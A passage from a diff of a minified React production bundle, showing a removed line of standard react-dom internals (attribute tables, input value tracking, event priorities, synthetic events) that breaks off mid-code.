@@ -1,3 +1,9717 @@
 /*! For license information please see main.9dcfcc1e.js.LICENSE.txt */
-(()=>{"use strict";var e={730(e,t,n){var r=n(43),a=n(853);function s(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var o=new Set,i={};function l(e,t){c(e,t),c(e+"Capture",t)}function c(e,t){for(i[e]=t,e=0;e<t.length;e++)o.add(t[e])}var u=!("undefined"===typeof window||"undefined"===typeof window.document||"undefined"===typeof window.document.createElement),d=Object.prototype.hasOwnProperty,h=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,f={},p={};function m(e,t,n,r,a,s,o){this.acceptsBooleans=2===t||3===t||4===t,this.attributeName=r,this.attributeNamespace=a,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=s,this.removeEmptyString=o}var g={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){g[e]=new m(e,0,!1,e,null,!1,!1)}),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];g[t]=new m(t,1,!1,e[1],null,!1,!1)}),["contentEditable","draggable","spellCheck","value"].forEach(function(e){g[e]=new m(e,2,!1,e.toLowerCase(),null,!1,!1)}),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){g[e]=new m(e,2,!1,e,null,!1,!1)}),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){g[e]=new m(e,3,!1,e.toLowerCase(),null,!1,!1)}),["checked","multiple","muted","selected"].forEach(function(e){g[e]=new m(e,3,!0,e,null,!1,!1)}),["capture","download"].forEach(function(e){g[e]=new m(e,4,!1,e,null,!1,!1)}),["cols","rows","size","span"].forEach(function(e){g[e]=new m(e,6,!1,e,null,!1,!1)}),["rowSpan","start"].forEach(function(e){g[e]=new m(e,5,!1,e.toLowerCase(),null,!1,!1)});var v=/[\-:]([a-z])/g;function y(e){return e[1].toUpperCase()}function b(e,t,n,r){var a=g.hasOwnProperty(t)?g[t]:null;(null!==a?0!==a.type:r||!(2<t.length)||"o"!==t[0]&&"O"!==t[0]||"n"!==t[1]&&"N"!==t[1])&&(function(e,t,n,r){if(null===t||"undefined"===typeof t||function(e,t,n,r){if(null!==n&&0===n.type)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return!r&&(null!==n?!n.acceptsBooleans:"data-"!==(e=e.toLowerCase().slice(0,5))&&"aria-"!==e);default:return!1}}(e,t,n,r))return!0;if(r)return!1;if(null!==n)switch(n.type){case 3:return!t;case 4:return!1===t;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}(t,n,a,r)&&(n=null),r||null===a?function(e){return!!d.call(p,e)||!d.call(f,e)&&(h.test(e)?p[e]=!0:(f[e]=!0,!1))}(t)&&(null===n?e.removeAttribute(t):e.setAttribute(t,""+n)):a.mustUseProperty?e[a.propertyName]=null===n?3!==a.type&&"":n:(t=a.attributeName,r=a.attributeNamespace,null===n?e.removeAttribute(t):(n=3===(a=a.type)||4===a&&!0===n?"":""+n,r?e.setAttributeNS(r,t,n):e.setAttribute(t,n))))}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace(v,y);g[t]=new m(t,1,!1,e,null,!1,!1)}),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace(v,y);g[t]=new m(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)}),["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace(v,y);g[t]=new m(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)}),["tabIndex","crossOrigin"].forEach(function(e){g[e]=new m(e,1,!1,e.toLowerCase(),null,!1,!1)}),g.xlinkHref=new m("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach(function(e){g[e]=new m(e,1,!1,e.toLowerCase(),null,!0,!0)});var w=r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,_=Symbol.for("react.element"),k=Symbol.for("react.portal"),x=Symbol.for("react.fragment"),S=Symbol.for("react.strict_mode"),E=Symbol.for("react.profiler"),j=Symbol.for("react.provider"),T=Symbol.for("react.context"),C=Symbol.for("react.forward_ref"),N=Symbol.for("react.suspense"),R=Symbol.for("react.suspense_list"),P=Symbol.for("react.memo"),O=Symbol.for("react.lazy");Symbol.for("react.scope"),Symbol.for("react.debug_trace_mode");var A=Symbol.for("react.offscreen");Symbol.for("react.legacy_hidden"),Symbol.for("react.cache"),Symbol.for("react.tracing_marker");var I=Symbol.iterator;function L(e){return null===e||"object"!==typeof e?null:"function"===typeof(e=I&&e[I]||e["@@iterator"])?e:null}var D,U=Object.assign;function M(e){if(void 0===D)try{throw Error()}catch(n){var t=n.stack.trim().match(/\n( *(at )?)/);D=t&&t[1]||""}return"\n"+D+e}var z=!1;function B(e,t){if(!e||z)return"";z=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),"object"===typeof Reflect&&Reflect.construct){try{Reflect.construct(t,[])}catch(c){var r=c}Reflect.construct(e,[],t)}else{try{t.call()}catch(c){r=c}e.call(t.prototype)}else{try{throw Error()}catch(c){r=c}e()}}catch(c){if(c&&r&&"string"===typeof c.stack){for(var a=c.stack.split("\n"),s=r.stack.split("\n"),o=a.length-1,i=s.length-1;1<=o&&0<=i&&a[o]!==s[i];)i--;for(;1<=o&&0<=i;o--,i--)if(a[o]!==s[i]){if(1!==o||1!==i)do{if(o--,0>--i||a[o]!==s[i]){var l="\n"+a[o].replace(" at new "," at ");return e.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",e.displayName)),l}}while(1<=o&&0<=i);break}}}finally{z=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?M(e):""}function F(e){switch(e.tag){case 5:return M(e.type);case 16:return M("Lazy");case 13:return M("Suspense");case 19:return M("SuspenseList");case 0:case 2:case 15:return e=B(e.type,!1);case 11:return e=B(e.type.render,!1);case 1:return e=B(e.type,!0);default:return""}}function V(e){if(null==e)return null;if("function"===typeof e)return e.displayName||e.name||null;if("string"===typeof e)return e;switch(e){case x:return"Fragment";case k:return"Portal";case E:return"Profiler";case S:return"StrictMode";case N:return"Suspense";case R:return"SuspenseList"}if("object"===typeof e)switch(e.$$typeof){case T:return(e.displayName||"Context")+".Consumer";case j:return(e._context.displayName||"Context")+".Provider";case C:var t=e.render;return(e=e.displayName)||(e=""!==(e=t.displayName||t.name||"")?"ForwardRef("+e+")":"ForwardRef"),e;case P:return null!==(t=e.displayName||null)?t:V(e.type)||"Memo";case O:t=e._payload,e=e._init;try{return V(e(t))}catch(n){}}return null}function q(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=(e=t.render).displayName||e.name||"",t.displayName||(""!==e?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return V(t);case 8:return t===S?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if("function"===typeof t)return t.displayName||t.name||null;if("string"===typeof t)return t}return null}function W(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":case"object":return e;default:return""}}function H(e){var t=e.type;return(e=e.nodeName)&&"input"===e.toLowerCase()&&("checkbox"===t||"radio"===t)}function K(e){e._valueTracker||(e._valueTracker=function(e){var t=H(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),r=""+e[t];if(!e.hasOwnProperty(t)&&"undefined"!==typeof n&&"function"===typeof n.get&&"function"===typeof n.set){var a=n.get,s=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return a.call(this)},set:function(e){r=""+e,s.call(this,e)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(e){r=""+e},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}(e))}function G(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r="";return e&&(r=H(e)?e.checked?"true":"false":e.value),(e=r)!==n&&(t.setValue(e),!0)}function J(e){if("undefined"===typeof(e=e||("undefined"!==typeof document?document:void 0)))return null;try{return e.activeElement||e.body}catch(t){return e.body}}function $(e,t){var n=t.checked;return U({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:null!=n?n:e._wrapperState.initialChecked})}function Q(e,t){var n=null==t.defaultValue?"":t.defaultValue,r=null!=t.checked?t.checked:t.defaultChecked;n=W(null!=t.value?t.value:n),e._wrapperState={initialChecked:r,initialValue:n,controlled:"checkbox"===t.type||"radio"===t.type?null!=t.checked:null!=t.value}}function Y(e,t){null!=(t=t.checked)&&b(e,"checked",t,!1)}function X(e,t){Y(e,t);var n=W(t.value),r=t.type;if(null!=n)"number"===r?(0===n&&""===e.value||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if("submit"===r||"reset"===r)return void e.removeAttribute("value");t.hasOwnProperty("value")?ee(e,t.type,n):t.hasOwnProperty("defaultValue")&&ee(e,t.type,W(t.defaultValue)),null==t.checked&&null!=t.defaultChecked&&(e.defaultChecked=!!t.defaultChecked)}function Z(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var r=t.type;if(!("submit"!==r&&"reset"!==r||void 0!==t.value&&null!==t.value))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}""!==(n=e.name)&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,""!==n&&(e.name=n)}function ee(e,t,n){"number"===t&&J(e.ownerDocument)===e||(null==n?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var te=Array.isArray;function ne(e,t,n,r){if(e=e.options,t){t={};for(var a=0;a<n.length;a++)t["$"+n[a]]=!0;for(n=0;n<e.length;n++)a=t.hasOwnProperty("$"+e[n].value),e[n].selected!==a&&(e[n].selected=a),a&&r&&(e[n].defaultSelected=!0)}else{for(n=""+W(n),t=null,a=0;a<e.length;a++){if(e[a].value===n)return e[a].selected=!0,void(r&&(e[a].defaultSelected=!0));null!==t||e[a].disabled||(t=e[a])}null!==t&&(t.selected=!0)}}function re(e,t){if(null!=t.dangerouslySetInnerHTML)throw Error(s(91));return U({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function ae(e,t){var n=t.value;if(null==n){if(n=t.children,t=t.defaultValue,null!=n){if(null!=t)throw Error(s(92));if(te(n)){if(1<n.length)throw Error(s(93));n=n[0]}t=n}null==t&&(t=""),n=t}e._wrapperState={initialValue:W(n)}}function se(e,t){var n=W(t.value),r=W(t.defaultValue);null!=n&&((n=""+n)!==e.value&&(e.value=n),null==t.defaultValue&&e.defaultValue!==n&&(e.defaultValue=n)),null!=r&&(e.defaultValue=""+r)}function oe(e){var t=e.textContent;t===e._wrapperState.initialValue&&""!==t&&null!==t&&(e.value=t)}function ie(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function le(e,t){return null==e||"http://www.w3.org/1999/xhtml"===e?ie(t):"http://www.w3.org/2000/svg"===e&&"foreignObject"===t?"http://www.w3.org/1999/xhtml":e}var ce,ue,de=(ue=function(e,t){if("http://www.w3.org/2000/svg"!==e.namespaceURI||"innerHTML"in e)e.innerHTML=t;else{for((ce=ce||document.createElement("div")).innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=ce.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}},"undefined"!==typeof MSApp&&MSApp.execUnsafeLocalFunction?function(e,t,n,r){MSApp.execUnsafeLocalFunction(function(){return ue(e,t)})}:ue);function he(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&3===n.nodeType)return void(n.nodeValue=t)}e.textContent=t}var fe={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},pe=["Webkit","ms","Moz","O"];function me(e,t,n){return null==t||"boolean"===typeof t||""===t?"":n||"number"!==typeof t||0===t||fe.hasOwnProperty(e)&&fe[e]?(""+t).trim():t+"px"}function ge(e,t){for(var n in e=e.style,t)if(t.hasOwnProperty(n)){var r=0===n.indexOf("--"),a=me(n,t[n],r);"float"===n&&(n="cssFloat"),r?e.setProperty(n,a):e[n]=a}}Object.keys(fe).forEach(function(e){pe.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),fe[t]=fe[e]})});var ve=U({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ye(e,t){if(t){if(ve[e]&&(null!=t.children||null!=t.dangerouslySetInnerHTML))throw Error(s(137,e));if(null!=t.dangerouslySetInnerHTML){if(null!=t.children)throw Error(s(60));if("object"!==typeof t.dangerouslySetInnerHTML||!("__html"in t.dangerouslySetInnerHTML))throw Error(s(61))}if(null!=t.style&&"object"!==typeof t.style)throw Error(s(62))}}function be(e,t){if(-1===e.indexOf("-"))return"string"===typeof t.is;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var we=null;function _e(e){return(e=e.target||e.srcElement||window).correspondingUseElement&&(e=e.correspondingUseElement),3===e.nodeType?e.parentNode:e}var ke=null,xe=null,Se=null;function Ee(e){if(e=ba(e)){if("function"!==typeof ke)throw Error(s(280));var t=e.stateNode;t&&(t=_a(t),ke(e.stateNode,e.type,t))}}function je(e){xe?Se?Se.push(e):Se=[e]:xe=e}function Te(){if(xe){var e=xe,t=Se;if(Se=xe=null,Ee(e),t)for(e=0;e<t.length;e++)Ee(t[e])}}function Ce(e,t){return e(t)}function Ne(){}var Re=!1;function Pe(e,t,n){if(Re)return e(t,n);Re=!0;try{return Ce(e,t,n)}finally{Re=!1,(null!==xe||null!==Se)&&(Ne(),Te())}}function Oe(e,t){var n=e.stateNode;if(null===n)return null;var r=_a(n);if(null===r)return null;n=r[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(r=!("button"===(e=e.type)||"input"===e||"select"===e||"textarea"===e)),e=!r;break e;default:e=!1}if(e)return null;if(n&&"function"!==typeof n)throw Error(s(231,t,typeof n));return n}var Ae=!1;if(u)try{var Ie={};Object.defineProperty(Ie,"passive",{get:function(){Ae=!0}}),window.addEventListener("test",Ie,Ie),window.removeEventListener("test",Ie,Ie)}catch(ue){Ae=!1}function Le(e,t,n,r,a,s,o,i,l){var c=Array.prototype.slice.call(arguments,3);try{t.apply(n,c)}catch(u){this.onError(u)}}var De=!1,Ue=null,Me=!1,ze=null,Be={onError:function(e){De=!0,Ue=e}};function Fe(e,t,n,r,a,s,o,i,l){De=!1,Ue=null,Le.apply(Be,arguments)}function Ve(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do{0!==(4098&(t=e).flags)&&(n=t.return),e=t.return}while(e)}return 3===t.tag?n:null}function qe(e){if(13===e.tag){var t=e.memoizedState;if(null===t&&(null!==(e=e.alternate)&&(t=e.memoizedState)),null!==t)return t.dehydrated}return null}function We(e){if(Ve(e)!==e)throw Error(s(188))}function He(e){return null!==(e=function(e){var t=e.alternate;if(!t){if(null===(t=Ve(e)))throw Error(s(188));return t!==e?null:e}for(var n=e,r=t;;){var a=n.return;if(null===a)break;var o=a.alternate;if(null===o){if(null!==(r=a.return)){n=r;continue}break}if(a.child===o.child){for(o=a.child;o;){if(o===n)return We(a),e;if(o===r)return We(a),t;o=o.sibling}throw Error(s(188))}if(n.return!==r.return)n=a,r=o;else{for(var i=!1,l=a.child;l;){if(l===n){i=!0,n=a,r=o;break}if(l===r){i=!0,r=a,n=o;break}l=l.sibling}if(!i){for(l=o.child;l;){if(l===n){i=!0,n=o,r=a;break}if(l===r){i=!0,r=o,n=a;break}l=l.sibling}if(!i)throw Error(s(189))}}if(n.alternate!==r)throw Error(s(190))}if(3!==n.tag)throw Error(s(188));return n.stateNode.current===n?e:t}(e))?Ke(e):null}function Ke(e){if(5===e.tag||6===e.tag)return e;for(e=e.child;null!==e;){var t=Ke(e);if(null!==t)return t;e=e.sibling}return null}var Ge=a.unstable_scheduleCallback,Je=a.unstable_cancelCallback,$e=a.unstable_shouldYield,Qe=a.unstable_requestPaint,Ye=a.unstable_now,Xe=a.unstable_getCurrentPriorityLevel,Ze=a.unstable_ImmediatePriority,et=a.unstable_UserBlockingPriority,tt=a.unstable_NormalPriority,nt=a.unstable_LowPriority,rt=a.unstable_IdlePriority,at=null,st=null;var ot=Math.clz32?Math.clz32:function(e){return e>>>=0,0===e?32:31-(it(e)/lt|0)|0},it=Math.log,lt=Math.LN2;var ct=64,ut=4194304;function dt(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return 4194240&e;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return 130023424&e;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function ht(e,t){var n=e.pendingLanes;if(0===n)return 0;var r=0,a=e.suspendedLanes,s=e.pingedLanes,o=268435455&n;if(0!==o){var i=o&~a;0!==i?r=dt(i):0!==(s&=o)&&(r=dt(s))}else 0!==(o=n&~a)?r=dt(o):0!==s&&(r=dt(s));if(0===r)return 0;if(0!==t&&t!==r&&0===(t&a)&&((a=r&-r)>=(s=t&-t)||16===a&&0!==(4194240&s)))return t;if(0!==(4&r)&&(r|=16&n),0!==(t=e.entangledLanes))for(e=e.entanglements,t&=r;0<t;)a=1<<(n=31-ot(t)),r|=e[n],t&=~a;return r}function ft(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;default:return-1}}function pt(e){return 0!==(e=-1073741825&e.pendingLanes)?e:1073741824&e?1073741824:0}function mt(){var e=ct;return 0===(4194240&(ct<<=1))&&(ct=64),e}function gt(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function vt(e,t,n){e.pendingLanes|=t,536870912!==t&&(e.suspendedLanes=0,e.pingedLanes=0),(e=e.eventTimes)[t=31-ot(t)]=n}function yt(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-ot(n),a=1<<r;a&t|e[r]&t&&(e[r]|=t),n&=~a}}var bt=0;function wt(e){return 1<(e&=-e)?4<e?0!==(268435455&e)?16:536870912:4:1}var _t,kt,xt,St,Et,jt=!1,Tt=[],Ct=null,Nt=null,Rt=null,Pt=new Map,Ot=new Map,At=[],It="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Lt(e,t){switch(e){case"focusin":case"focusout":Ct=null;break;case"dragenter":case"dragleave":Nt=null;break;case"mouseover":case"mouseout":Rt=null;break;case"pointerover":case"pointerout":Pt.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ot.delete(t.pointerId)}}function Dt(e,t,n,r,a,s){return null===e||e.nativeEvent!==s?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:s,targetContainers:[a]},null!==t&&(null!==(t=ba(t))&&kt(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,null!==a&&-1===t.indexOf(a)&&t.push(a),e)}function Ut(e){var t=ya(e.target);if(null!==t){var n=Ve(t);if(null!==n)if(13===(t=n.tag)){if(null!==(t=qe(n)))return e.blockedOn=t,void Et(e.priority,function(){xt(n)})}else if(3===t&&n.stateNode.current.memoizedState.isDehydrated)return void(e.blockedOn=3===n.tag?n.stateNode.containerInfo:null)}e.blockedOn=null}function Mt(e){if(null!==e.blockedOn)return!1;for(var t=e.targetContainers;0<t.length;){var n=$t(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(null!==n)return null!==(t=ba(n))&&kt(t),e.blockedOn=n,!1;var r=new(n=e.nativeEvent).constructor(n.type,n);we=r,n.target.dispatchEvent(r),we=null,t.shift()}return!0}function zt(e,t,n){Mt(e)&&n.delete(t)}function Bt(){jt=!1,null!==Ct&&Mt(Ct)&&(Ct=null),null!==Nt&&Mt(Nt)&&(Nt=null),null!==Rt&&Mt(Rt)&&(Rt=null),Pt.forEach(zt),Ot.forEach(zt)}function Ft(e,t){e.blockedOn===t&&(e.blockedOn=null,jt||(jt=!0,a.unstable_scheduleCallback(a.unstable_NormalPriority,Bt)))}function Vt(e){function t(t){return Ft(t,e)}if(0<Tt.length){Ft(Tt[0],e);for(var n=1;n<Tt.length;n++){var r=Tt[n];r.blockedOn===e&&(r.blockedOn=null)}}for(null!==Ct&&Ft(Ct,e),null!==Nt&&Ft(Nt,e),null!==Rt&&Ft(Rt,e),Pt.forEach(t),Ot.forEach(t),n=0;n<At.length;n++)(r=At[n]).blockedOn===e&&(r.blockedOn=null);for(;0<At.length&&null===(n=At[0]).blockedOn;)Ut(n),null===n.blockedOn&&At.shift()}var qt=w.ReactCurrentBatchConfig,Wt=!0;function Ht(e,t,n,r){var a=bt,s=qt.transition;qt.transition=null;try{bt=1,Gt(e,t,n,r)}finally{bt=a,qt.transition=s}}function Kt(e,t,n,r){var a=bt,s=qt.transition;qt.transition=null;try{bt=4,Gt(e,t,n,r)}finally{bt=a,qt.transition=s}}function Gt(e,t,n,r){if(Wt){var a=$t(e,t,n,r);if(null===a)Wr(e,t,r,Jt,n),Lt(e,r);else if(function(e,t,n,r,a){switch(t){case"focusin":return Ct=Dt(Ct,e,t,n,r,a),!0;case"dragenter":return Nt=Dt(Nt,e,t,n,r,a),!0;case"mouseover":return Rt=Dt(Rt,e,t,n,r,a),!0;case"pointerover":var s=a.pointerId;return Pt.set(s,Dt(Pt.get(s)||null,e,t,n,r,a)),!0;case"gotpointercapture":return s=a.pointerId,Ot.set(s,Dt(Ot.get(s)||null,e,t,n,r,a)),!0}return!1}(a,e,t,n,r))r.stopPropagation();else if(Lt(e,r),4&t&&-1<It.indexOf(e)){for(;null!==a;){var s=ba(a);if(null!==s&&_t(s),null===(s=$t(e,t,n,r))&&Wr(e,t,r,Jt,n),s===a)break;a=s}null!==a&&r.stopPropagation()}else Wr(e,t,r,null,n)}}var Jt=null;function $t(e,t,n,r){if(Jt=null,null!==(e=ya(e=_e(r))))if(null===(t=Ve(e)))e=null;else if(13===(n=t.tag)){if(null!==(e=qe(t)))return e;e=null}else if(3===n){if(t.stateNode.current.memoizedState.isDehydrated)return 3===t.tag?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return Jt=e,null}function Qt(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Xe()){case Ze:return 1;case et:return 4;case tt:case nt:return 16;case rt:return 536870912;default:return 16}default:return 16}}var Yt=null,Xt=null,Zt=null;function en(){if(Zt)return Zt;var e,t,n=Xt,r=n.length,a="value"in Yt?Yt.value:Yt.textContent,s=a.length;for(e=0;e<r&&n[e]===a[e];e++);var o=r-e;for(t=1;t<=o&&n[r-t]===a[s-t];t++);return Zt=a.slice(e,1<t?1-t:void 0)}function tn(e){var t=e.keyCode;return"charCode"in e?0===(e=e.charCode)&&13===t&&(e=13):e=t,10===e&&(e=13),32<=e||13===e?e:0}function nn(){return!0}function rn(){return!1}function an(e){function t(t,n,r,a,s){for(var o in this._reactName=t,this._targetInst=r,this.type=n,this.nativeEvent=a,this.target=s,this.currentTarget=null,e)e.hasOwnProperty(o)&&(t=e[o],this[o]=t?t(a):a[o]);return this.isDefaultPrevented=(null!=a.defaultPrevented?a.defaultPrevented:!1===a.returnValue)?nn:rn,this.isPropagationStopped=rn,this}return U(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var e=this.nativeEvent;e&&(e.preventDefault?e.preventDefault():"unknown"!==typeof e.returnValue&&(e.returnValue=!1),this.isDefaultPrevented=nn)},stopPropagation:function(){var e=this.nativeEvent;e&&(e.stopPropagation?e.stopPropagation():"unknown"!==typeof e.cancelBubble&&(e.cancelBubble=!0),this.isPropagationStopped=nn)},persist:function(){},isPersistent:nn}),t}var sn,on,ln,cn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},un=an(cn),dn=U({},cn,{view:0,detail:0}),hn=an(dn),fn=U({},dn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:En,button:0,buttons:0,relatedTarget:function(e){return void 0===e.relatedTarget?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==ln&&(ln&&"mousemove"===e.type?(sn=e.screenX-ln.screenX,on=e.screenY-ln.screenY):on=sn=0,ln=e),sn)},movementY:function(e){return"movementY"in e?e.movementY:on}}),pn=an(fn),mn=an(U({},fn,{dataTransfer:0})),gn=an(U({},dn,{relatedTarget:0})),vn=an(U({},cn,{animationName:0,elapsedTime:0,pseudoElement:0})),yn=U({},cn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),bn=an(yn),wn=an(U({},cn,{data:0})),_n={Esc:"Escape",Spacebar:" 